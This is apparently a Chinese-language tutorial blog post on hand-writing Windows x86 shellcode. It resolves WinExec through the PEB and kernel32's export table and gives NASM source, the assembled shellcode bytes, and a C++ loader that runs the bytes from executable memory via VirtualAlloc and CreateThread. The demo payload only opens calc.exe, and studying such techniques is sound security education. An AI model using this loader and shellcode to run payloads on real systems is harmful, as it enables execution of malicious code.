# 【Day 08】歡迎來到實力至上主義的 Shellcode (下) - Windows x86 Shellcode

## 環境
* Windows 10 21H1
* Visual Studio 2019
* NASM 2.14.02

## 前情提要
歡迎來到實力至上主義的 Shellcode (上) 我們除了認識 Shellcode 和比較 Linux 與 Windows 之外，也了解如何透過訪問各種結構得到 kernel32.dll 的 Base Address。

1. 找到 kernel32.dll
    * 取得 PEB 位址
    * 取得 PEB_LDR_DATA 位址
    * 取得 InMemoryOrderModuleList 位址
    * 取得 kernel32.dll 的 Base Address
2. 從 kernel32.dll 中找到 WinExec 函數
    * 取得 NT Header 位址
    * 取得 Export Directory 位址
    * 取得 Address Table、Name Pointer Table、Ordinal Table
    * 迴圈尋找目標函數
3. 執行 WinExec

## 詳細流程
### 2. 從 kernel32.dll 中找到 WinExec 函數
#### 取得 NT Header 位址
要找到 NT Header，首先要找到 DOS Header。不過已經找到了，它的位址就在 Image Base Address，因為我們在上個步驟已經取得了 kernel32.dll 的 Base Address。現在來看看 [DOS Header](https://www.nirsoft.net/kernel_struct/vista/IMAGE_DOS_HEADER.html) 的結構
```
typedef struct _IMAGE_DOS_HEADER
{
     WORD e_magic;
     WORD e_cblp;
     WORD e_cp;
     WORD e_crlc;
     WORD e_cparhdr;
     WORD e_minalloc;
     WORD e_maxalloc;
     WORD e_ss;
     WORD e_sp;
     WORD e_csum;
     WORD e_ip;
     WORD e_cs;
     WORD e_lfarlc;
     WORD e_ovno;
     WORD e_res[4];
     WORD e_oemid;
     WORD e_oeminfo;
     WORD e_res2[10];
     LONG e_lfanew;
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
```

其中最後一個成員 e_lfanew 就是 NT Header 的 RVA(Relative Virtual Address)，RVA 就是與 Image Base 的距離。也就是說 `Image Base + e_lfanew` 就是 NT Header 的位址。

#### 取得 Export Directory 位址
[Optional Header](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32) 就在 NT Header 中。
```
typedef struct _IMAGE_NT_HEADERS {
  DWORD                   Signature;
  IMAGE_FILE_HEADER       FileHeader;
  IMAGE_OPTIONAL_HEADER32 OptionalHeader;
} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
```

[File Header](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header) 的大小為 0x14，所以 `NT Header + 0x18` 就是 Optional Header 的位址。

DataDirectory 是 [Optional Header](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32) 的最後一個成員，也就是 Optional Header 的 Offset 0x60 的位址。
```
typedef struct _IMAGE_OPTIONAL_HEADER {
  WORD                 Magic;
  BYTE                 MajorLinkerVersion;
  BYTE                 MinorLinkerVersion;
  DWORD                SizeOfCode;
  DWORD                SizeOfInitializedData;
  DWORD                SizeOfUninitializedData;
  DWORD                AddressOfEntryPoint;
  DWORD                BaseOfCode;
  DWORD                BaseOfData;
  DWORD                ImageBase;
  DWORD                SectionAlignment;
  DWORD                FileAlignment;
  WORD                 MajorOperatingSystemVersion;
  WORD                 MinorOperatingSystemVersion;
  WORD                 MajorImageVersion;
  WORD                 MinorImageVersion;
  WORD                 MajorSubsystemVersion;
  WORD                 MinorSubsystemVersion;
  DWORD                Win32VersionValue;
  DWORD                SizeOfImage;
  DWORD                SizeOfHeaders;
  DWORD                CheckSum;
  WORD                 Subsystem;
  WORD                 DllCharacteristics;
  DWORD                SizeOfStackReserve;
  DWORD                SizeOfStackCommit;
  DWORD                SizeOfHeapReserve;
  DWORD                SizeOfHeapCommit;
  DWORD                LoaderFlags;
  DWORD                NumberOfRvaAndSizes;
  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
```

所以 `NT Header + 0x18 + 0x60` 就是 DataDirectory 結構。[DataDirectory](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory)  結構如下，可以看到成員 VirtualAddress，它是我們的目標 Export Directory 的 RVA。因此 `Image Base + Export Directory 的 RVA` 就是 Export Directory 的位址。
```
typedef struct _IMAGE_DATA_DIRECTORY {
  DWORD VirtualAddress;
  DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
```

#### 取得 Address Table、Name Pointer Table、Ordinal Table
觀察一下 [Export Directory](http://pinvoke.net/default.aspx/Structures.IMAGE_EXPORT_DIRECTORY) 結構，其中的三個成員 AddressOfFunctions、AddressOfNames、AddressOfNameOrdinals 就分別是我們的目標 Address Table、Name Pointer Table、Ordinal Table 的 RVA，因此只要個別加上 Image Base 就可以取得這三個 Table 的位址。除此之外，成員 NumberOfFunctions 存放函數的數量，在等等的 Shellcode 中也會用上。
```
typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD   Characteristics;
    DWORD   TimeDateStamp;
    WORD    MajorVersion;
    WORD    MinorVersion;
    DWORD   Name;
    DWORD   Base;
    DWORD   NumberOfFunctions;
    DWORD   NumberOfNames;
    DWORD   AddressOfFunctions;
    DWORD   AddressOfNames; 
    DWORD   AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;
```

#### 迴圈尋找目標函數
這個步驟只要了解 Address Table、Name Pointer Table、Ordinal Table 之間的關係就很容易了，Name Table 中存放著所有 Export Function 名稱字串的 RVA，找到目標函數名稱後，拿對應的 Name Table 的 Index 去找 Ordinal Table。再把 Ordinal Table 對應的值當作 Index 去找 Function Table，得到的值就是目標 Function 的 RVA。

舉例來說，現在目標是 WinExec 函數。
1. 迴圈掃過 Name Table，假設找到 Name Table 的第 x 項是 WinExec 字串的 RVA，也就是 `Name Table + 4 * x`。注意 Name Table 的每一項都是 4 Bytes 大小。
2. 再來找 Ordinal Table 的第 x 項，也就是 `Ordinal Table + 2 * x`，這裡存的值假設是 y。注意 Ordinal Table 的每一項都是 2 Bytes 大小。
3. 最後找 Address Table 的第 y 項，也就是 `Address Table + 4 * y`，它就是 WinExec 函數的 RVA。注意 Address Table 的每一項都是 4 Bytes 大小。

### 3. 執行 WinExec
這個步驟就是使用前兩大步驟辛苦找到的 WinExec 而已，唯一可以講的大概就是 [Calling Convention](https://en.wikipedia.org/wiki/X86_calling_conventions) 的部分，以 32-bit Windows 的 WinExec 來說就只要把參數堆到 Stack 上就可以了，所以在呼叫這個函數前分別把 `C:\Windows\System32\calc.exe` 字串位址和 10 `Push` 到 Stack 中。

其中的 10 是 [WinExec](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow) 的第二個參數 uCmdShow，意思是 SW_SHOWDEFAULT。

## POC
主要是參考 [Basics of Windows shellcode writing](https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html#resources)，有改一點東西以符合 NASM 還有加一些註解。在我的 GitHub [zeze-zeze/2021iThome](https://github.com/zeze-zeze/2021iThome/tree/master/%E6%AD%A1%E8%BF%8E%E4%BE%86%E5%88%B0%E5%AF%A6%E5%8A%9B%E8%87%B3%E4%B8%8A%E4%B8%BB%E7%BE%A9%E7%9A%84Shellcode) 可以找到完整版的 POC。
```=
; 2. 從 kernel32.dll 中找到 WinExec 函數
; 取得 NT Header 位址
mov eax, [ebx + 3Ch]            ; NT Header 的 RVA
add eax, ebx                    ; NT Header = Image Base + e_lfanew

; 取得 Export Directory 位址
mov eax, [eax + 78h]            ; DataDirectory 結構，成員 VirtualAddress 是 Export Directory 的 RVA
add eax, ebx                    ; Export Directory = Image Base + Export Directory 的 RVA

; 取得 Address Table、Name Pointer Table、Ordinal Table
mov ecx, [eax + 24h]            ; Ordinal Table 的 RVA
add ecx, ebx                    ; Ordinal Table 的位址
mov [ebp-0Ch], ecx

mov edi, [eax + 20h]            ; Name Pointer Table 的 RVA
add edi, ebx                    ; Name Pointer Table 的位址
mov [ebp-10h], edi

mov edx, [eax + 1Ch]            ; Address Table 的 RVA
add edx, ebx                    ; Address Table 的位址
mov [ebp-14h], edx

mov edx, [eax + 14h]            ; Export Directory 其中一個成員 NumberOfFunctions
xor eax, eax

; 迴圈尋找目標函數
.loop:
    mov edi, [ebp-10h]          ; Name Pointer Table
    mov esi, [ebp-4]            ; 目標字串 "WinExec\x00"
    xor ecx, ecx

    cld
    mov edi, [edi + eax*4]      ; Name Table + 4 * x 是函數名稱的 RVA
    add edi, ebx                ; 取得函數名稱的位址
    add cx, 8
    repe cmpsb                  ; 比較字串是否為 WinExec
    jz start.found

    inc eax
    cmp eax, edx
    jb start.loop

    add esp, 24h
    jmp start.end

.found:
    mov ecx, [ebp-0Ch]          ; Ordinal Table
    mov edx, [ebp-14h]          ; Address Table

    mov ax, [ecx + eax*2]       ; y = Ordinal Table + 2 * x
    mov eax, [edx + eax*4]      ; WinExec 的 RVA = Address Table + 4 * y
    add eax, ebx


    ; 3. 執行 WinExec
    xor edx, edx
    push edx                    ; C:\Windows\System32\calc.exe
    push 6578652eh
    push 636c6163h
    push 5c32336dh
    push 65747379h
    push 535c7377h
    push 6f646e69h
    push 575c3a43h
    mov esi, esp

    push 10                     ; uCmdShow: SW_SHOWDEFAULT
    push esi                    ; lpCmdLine: "C:\Windows\System32\calc.exe"
    call eax                    ; WinExec("C:\Windows\System32\calc.exe", 10)

    add esp, 44h

.end:
    pop ebp
    pop edi
    pop esi
    pop edx
    pop ecx
    pop ebx
    pop eax
    ret
```

另外我寫了簡單的 Shellcode Loader，程式不難，但因為不是這篇的重點所以先略過。
```cpp=
#include <windows.h>

int main()
{
	char shellcode[] = "\x50\x53\x51\x52\x56\x57\x55\x89\xE5\x83\xEC\x18\x31\xF6\x56\x68\x78\x65\x63\x00\x68\x57\x69\x6E\x45\x89\x65\xFC\x64\x8B\x1D\x30\x00\x00\x00\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x5B\x10\x89\x5D\xF8\x8B\x43\x3C\x01\xD8\x8B\x40\x78\x01\xD8\x8B\x48\x24\x01\xD9\x89\x4D\xF4\x8B\x78\x20\x01\xDF\x89\x7D\xF0\x8B\x50\x1C\x01\xDA\x89\x55\xEC\x8B\x50\x14\x31\xC0\x8B\x7D\xF0\x8B\x75\xFC\x31\xC9\xFC\x8B\x3C\x87\x01\xDF\x66\x83\xC1\x08\xF3\xA6\x74\x0A\x40\x39\xD0\x72\xE5\x83\xC4\x24\xEB\x3F\x8B\x4D\xF4\x8B\x55\xEC\x66\x8B\x04\x41\x8B\x04\x82\x01\xD8\x31\xD2\x52\x68\x2E\x65\x78\x65\x68\x63\x61\x6C\x63\x68\x6D\x33\x32\x5C\x68\x79\x73\x74\x65\x68\x77\x73\x5C\x53\x68\x69\x6E\x64\x6F\x68\x43\x3A\x5C\x57\x89\xE6\x6A\x0A\x56\xFF\xD0\x83\xC4\x44\x5D\x5F\x5E\x5A\x59\x5B\x58\xC3";
							
	// 分配記憶體，其中權限是 PAGE_EXECUTE_READWRITE
	LPVOID addressPointer = VirtualAlloc(NULL, sizeof(shellcode), 0x3000, 0x40);
	
	// 把 shellcode 寫入分配的記憶體
	RtlMoveMemory(addressPointer, shellcode, sizeof(shellcode));
	
	// 建立 Thread 執行 shellcode
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);

	Sleep(1000);
	return 0;
}
```

## 實際測試
跟上一篇一樣使用 NASM + LazyIDA 把 Shellcode 複製後放到 Shellcode Loader 中執行，成功編譯並執行就會跳出一個小算盤。

## 參考資料
* [Basics of Windows shellcode writing](https://idafchev.github.io/exploit/2017/09/26/writing_windows_shellcode.html#resources)
* [Windows x64 Shellcode](https://mcdcyber.wordpress.com/2011/01/11/windows-x64-shellcode/)
* [A Beginner’s Guide to Windows Shellcode Execution Techniques](https://www.contextis.com/en/blog/a-beginners-guide-to-windows-shellcode-execution-techniques)
* [Calling Convention](https://en.wikipedia.org/wiki/X86_calling_conventions)
